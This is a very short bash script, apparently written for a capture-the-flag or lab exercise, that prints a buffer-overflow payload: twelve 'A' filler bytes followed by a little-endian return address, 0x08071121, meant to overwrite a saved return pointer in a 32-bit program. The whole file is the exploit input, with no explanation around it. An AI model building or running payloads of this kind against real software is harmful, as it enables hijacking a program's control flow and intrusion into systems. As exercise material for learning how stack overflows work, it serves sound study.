#!bin/bash

buffer=$(printf '\x41%.0s' {1..12}) #fill the buffer
ret_addr="\x21\x11\x07\x08"             #0x08071121

echo -en "$buffer$ret_addr"